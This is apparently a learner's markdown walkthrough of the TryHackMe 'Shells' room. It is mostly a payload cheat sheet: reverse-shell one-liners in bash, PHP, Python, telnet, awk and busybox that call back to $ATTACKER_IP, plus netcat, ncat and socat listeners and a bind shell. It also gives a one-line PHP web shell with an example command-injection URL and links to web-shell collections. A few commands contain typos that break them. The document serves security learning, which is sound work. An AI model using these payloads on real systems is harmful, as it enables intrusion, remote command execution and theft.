## Walkthrough of Shells room - THM

### What is a shell?
* software that allows user to interact with an OS
### What can attacker can do with a shell
* execute commands in the victims system
* Privilege Escalation
* Data Exfiltration
* Persistence and Maintenance Access
* Post-Exploitation activity - deploying malware,creatin hidden acound and deleting info
* Pivoting -  Access other system on the network

### Reverse Shell
```bash
#Set up listener in the attack box
nc -lvnp $PORT
#Listen, Verbose, No-Dns(use ip) , Port
# Attacker most use this ports: 53, 80, 8080, 443, 139, 445
```
#### bash reverse shells
```bash
#Simple bash reverse shell
bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&

#Bash Read Line reverse shell
exec 5<>/dev/tcp/$ATTACKER_IP/$PORT; cat <&5 | while read line; do $line 2>&5 >&5; done

#Bash with file descriptor 196 reverse shell
0<&196;exec 196<>/dev/tcp/$ATTACKER_IP/$PORT; sh <&196 >&196 2>&196
#Bash with file descriptor 5 reverse shell
bash -i 5<> /dev/tcp/$ATTACKER_IP/$PORT 0<&5 1>&5 2>&5

#Pipe reverse Shell(Uses bash)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc $Attacker_IP $PORT >/tmp/f
```
#### PHP reverse shells
```PHP
php -r '$sock=fsockopen("$ATTACKER_IP",$PORT);exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATTACKER_IP",$PORT);shell_exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATTACKER_IP",$PORT);system("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATTACKER_IP",$PORT);passthru("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATTACKER_IP",$PORT);popen("sh <&3 >&3 2>&3", "r");'
```

#### Python reveres shells
```python
python -c 'import os,pty,socket;s=socket.socket();s.connect(("$ATTACKER_IP",$PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

export RHOST="$ATTACKER_IP"; export RPORT=$PORT; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 

```

#### Telnet
```bash
TF=$(mktemp -u); mkfifo $TF && telnet $ATTACKER_IP$PORT 0<$TF | sh 1>$TF
```
#### awk
```bash
awk 'BEGIN {s = "/inet/tcp/0/$ATTACKER_IP/$PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
#### busybox
```bash
busybox nc $ATTACKER_IP $PORT -e sh
```

### Bind Shell
* run listener on victims machine that waits for connection on spesific port
* more detectable
* ports below 1024 require privileges
```bash
#Pipe bind Shell(Uses bash) 
#On the victims system -->
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

#On the attack system:
nc -nv $VICTIM_IP $PORT
#no-dns, verbose
```

### Another listeners(like netcat)
1. rlwrap
* Uses nc but allows:
    * Arrow up/down commands history
    * right and left errors
    * more stable shell
```bash
rlwrap nc -lvnp 443
```
2. ncat
* improved nc
* allows encrypted shell with `--ssl` flag
* allows setting specific host to connect with `--allow $ip`
* allows multi-connection with `--keep-open` OR `-k`

```bash
ncat --ssl -lvnp $port
#Can be used with rlwrap
ncat --ssl -lvnp $port

#notice the payload on the victims machine must send ssl for it to work
```
3. socat
* allows full & Stable tty without the use of python

```bash
#On Attacker system
socat -d -d FILE:`tty`,raw,echo=0 TCP-LISTEN:$port

#On victims system
socat TCP:$IP:$PORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane

```

### Web-Shell
* Web shell is a script written language like php, JSP, ASP. NET, Python
* used to get access to system running the web-application via upload 

#### Basic php web-shell
```php
<?php echo system($_GET['cmd']); ?>
```
* attacker will upload the file into the web-applicatio
* if the file is called shell.php
* attacker can access to the url of the file and inject commands
```
http://$URL/uploads/shell.php?cmd=id
```
* there are in-built web-shells in kali---->
* `/usr/share/webshells`

* web-shells arent very sutible for attack
* most time attacker will use web-shell to create a reverse-shell


#### Popular Web-Shells
1. p0wny-shell 
* minimalistic single file php script
```bash
git clone https://github.com/flozz/p0wny-shell.git
```

2. b374k shell
* more features
```bash
git clone https://github.com/b374k/b374k.git
```
3. c99 shell
* well known php web shell
```
https://www.r57shell.net/single.php?id=13
```
4. More web-shells found here
```
https://www.r57shell.net/
```